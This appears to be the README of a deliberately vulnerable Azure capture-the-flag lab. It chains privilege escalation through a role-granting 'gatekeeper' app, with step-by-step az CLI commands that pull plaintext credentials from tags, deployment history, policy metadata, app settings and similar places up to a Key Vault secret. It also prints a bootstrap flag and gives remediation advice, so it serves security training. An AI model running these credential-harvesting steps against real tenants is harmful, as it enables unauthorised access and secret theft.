# Gatekeeper Chain 2 — Flag-Gated RBAC Over More Plaintext-Credential Scenarios

**Provider:** Azure | **Category:** Privilege Escalation / Chained

## Scenario

Companion to `gatekeeper_chain`. It consolidates a **second** set of "plaintext
credentials in an Azure resource" scenarios into one flag-gated
privilege-escalation ladder.

You start with an Azure AD account that has **no access to anything**. A
self-service "gatekeeper" app grants you a real Azure role in exchange for the
previous stage's flag — each grant **scoped to exactly one resource (or resource
group)**, so you can only ever read the next scenario. Read its plaintext
credential (the next flag), submit it, and climb until you reach the Key Vault.

The gatekeeper is a container with a **User Access Administrator** managed
identity, so the grants are genuine.

## The ladder

```
Bootstrap   public blob (anonymous)              --submit--> Reader on the tags RG
Stage 1     resource-group tags (Reader)         --submit--> Reader on the deployment RG
Stage 2     ARM deployment history (Reader)      --submit--> Reader on the policy RG
Stage 3     policy assignment metadata (Reader)  --submit--> Reader on the Container App
Stage 4     Container App env (Reader)           --submit--> Reader on the Logic App
Stage 5     Logic App workflow (Reader)          --submit--> Reader on the Deployment Script
Stage 6     Deployment Script output (Reader)    --submit--> Website Contributor on the App Service
Stage 7     App Service settings (Website Contributor) --submit--> Reader on the Event Grid topic
Stage 8     Event Grid topic tags (Reader)             --submit--> Key Vault Secrets User
Final       Key Vault secret (Secrets User)               the flag
```

Three scenarios are resource-group-level (tags, deployment history, policy), so
each lives in its **own resource group** to keep stages isolated. One needs a
non-Reader role: App Service app settings require the `config/list` action
(**Website Contributor**). Each stage is a standalone lab's mechanism
(`resource_group_tags`, `arm_deployment_history`, `policy_assignment_metadata`,
`container_app_env_vars`, `logic_app_credentials`, `deployment_script`,
`app_service_env_vars`, `eventgrid_webhook_token`) reusing its flag.

## Walkthrough

The deploy prints the attacker credentials, the gatekeeper URL, and the public
starting blob.

> Each granted role takes **1–2 minutes** to propagate. If a step says
> "authorization failed", wait and retry — it's RBAC catching up.

> **Container App region:** the Container App stage runs on a managed AKS backend
> that occasionally returns `AKSCapacityHeavyUsage` in a busy region. You can move
> just that stage (its environment + Log Analytics) to another region without
> moving the rest of the lab:
> `export TF_VAR_container_app_location="North Europe"` before `cnimbus azure create`.
> Empty (default) = same region as the rest of the lab.

### Bootstrap — first flag (no credentials needed)

```bash
curl -s "https://<storage-account>.blob.core.windows.net/public/welcome.txt"
GK="<gatekeeper-url>"
curl -s -X POST "$GK/unlock" -H 'Content-Type: application/json' \
  -d '{"flag":"CUMULONIMBUS{g4t3k33p3r2_b00tstr4p}"}'
az login --username <attacker_upn> --password <attacker_password>
```

### Stage 1 — resource-group tags (Reader on the tags RG)

```bash
az group show --name <tags-rg> --query tags
```

`deploy-token` is the flag; `next-hop` names the deployment RG. Submit → unlocks
**Reader on the deployment RG**.

### Stage 2 — ARM deployment history (Reader on the deployment RG)

```bash
az deployment group show -g <deploy-rg> -n app-infra-v1 --query properties.parameters
```

`adminApiKey` is the flag; `nextHop` names the policy RG. Submit → unlocks
**Reader on the policy RG**.

### Stage 3 — policy assignment metadata (Reader on the policy RG)

```bash
az policy assignment list --resource-group <policy-rg> --query "[].metadata"
```

`internal-token` is the flag; `next-hop` names the Container App. Submit → unlocks
**Reader on the Container App**.

### Stage 4 — Container App env vars (Reader on the container app)

```bash
az containerapp show -g <rg> -n <container-app> \
  --query "properties.template.containers[0].env"
```

`SECRET_FLAG` is the flag; `NEXT_HOP` names the Logic App. Submit → unlocks
**Reader on the Logic App**.

### Stage 5 — Logic App workflow (Reader on the logic app)

```bash
az rest --method get --url \
  "https://management.azure.com/subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Logic/workflows/<logic-app>?api-version=2019-05-01"
# inspect the Notify-Backend action: the Authorization header is the flag
```

Submit → unlocks **Reader on the Deployment Script**.

### Stage 6 — Deployment Script output (Reader on the script)

```bash
az deployment-scripts show -g <rg> -n <script> --query "outputs"
```

`flag` is the flag; `nextHop` names the App Service. Submit → unlocks **Website
Contributor on the App Service**.

### Stage 7 — App Service app settings (Website Contributor)

```bash
az webapp config appsettings list -g <rg> -n <app-service> -o table
```

`SECRET_FLAG` is the flag; `NEXT_HOP` names the Event Grid topic. Submit →
unlocks **Reader on the Event Grid topic**.

### Stage 8 — Event Grid webhook token (Reader on the topic)

```bash
az eventgrid topic show -g <rg> -n <topic> --query tags
```

The `webhook-url` tag holds the configured webhook URL; its `token=` query
parameter is the flag. The `next-hop` tag names the Key Vault. Submit → unlocks
**Key Vault Secrets User**.

> Event Grid enforces a webhook ownership handshake on real subscriptions, so a
> fake endpoint can't be attached — the leaked token lives in the topic's
> configuration (tags) instead.

### Final — Key Vault secret

```bash
az keyvault secret show --vault-name <key-vault> --name app-flag --query value -o tsv
```

That value is the flag.

## Deployer requirement

The gatekeeper's managed identity is granted **User Access Administrator** on the
main RG and the three dedicated RGs. Creating those role assignments requires the
**service principal running the deployment to be Owner (or User Access
Administrator)** on the subscription — plain Contributor cannot delegate
role-assignment rights and the deploy will fail at that step.

## How to Fix in Production

- Don't expose a self-service endpoint that can assign roles; never give an
  internet-facing workload **User Access Administrator** / **Owner**.
- The per-stage lessons are the standalone labs': don't store secrets in resource
  tags, ARM deployment string parameters, policy metadata, Container App env
  vars, Logic App action headers, Deployment Script outputs, App Service app
  settings, or Event Grid webhook URLs. Use Key Vault references and secureString
  parameters.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Account Manipulation: Additional Cloud Roles | [T1098.003](https://attack.mitre.org/techniques/T1098/003/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) |
| Cloud Infrastructure Discovery | [T1580](https://attack.mitre.org/techniques/T1580/) |
